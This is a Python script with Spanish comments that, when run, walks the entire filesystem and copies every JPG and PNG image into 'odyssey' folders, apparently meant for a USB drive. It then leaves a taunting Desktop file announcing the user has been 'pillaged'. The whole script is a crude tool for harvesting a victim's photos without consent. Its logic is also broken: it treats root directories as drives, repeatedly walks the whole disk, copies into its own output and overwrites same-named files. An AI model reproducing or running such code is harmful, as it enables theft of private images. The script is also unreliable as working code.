import os
import shutil
import platform

def buscar_imagenes():
    # Obtener el directorio actual del script
    directorio_actual = os.getcwd()

    # Obtener la lista de unidades disponibles
    unidades = [unidad for unidad in os.listdir('/') if os.path.isdir(os.path.join('/', unidad))]

    # Buscar todas las imágenes en el sistema operativo
    for unidad in unidades:
        directorio_usb = os.path.join('/', unidad, 'odyssey')
        os.makedirs(directorio_usb, exist_ok=True)
        for root, _, files in os.walk('/'):
            for file in files:
                if file.endswith(('.jpg', '.jpeg', '.png')):
                    ruta_original = os.path.join(root, file)
                    ruta_destino = os.path.join(directorio_usb, file)
                    shutil.copy2(ruta_original, ruta_destino)

def identificar_sistema_operativo():
    sistema_operativo = platform.system()
    if sistema_operativo == 'Windows':
        print("El script se está ejecutando en Windows")
    elif sistema_operativo == 'Linux':
        print("El script se está ejecutando en Linux")
    elif sistema_operativo == 'Darwin':
        print("El script se está ejecutando en macOS")
    else:
        print("No se pudo identificar el sistema operativo")

def crear_archivo():
    # Obtener el directorio del escritorio
    directorio_escritorio = os.path.join(os.path.expanduser("~"), "Escritorio")

    # Crear el archivo de texto
    nombre_archivo = "Testeando que esto funcione.txt"
    contenido_archivo = "Has sido 'pillaged', lacra"
    ruta_archivo = os.path.join(directorio_escritorio, nombre_archivo)

    with open(ruta_archivo, "w") as archivo:
        archivo.write(contenido_archivo)

    print("Se ha creado el archivo en el escritorio")

# Llamar a las funciones
buscar_imagenes()
identificar_sistema_operativo()
crear_archivo()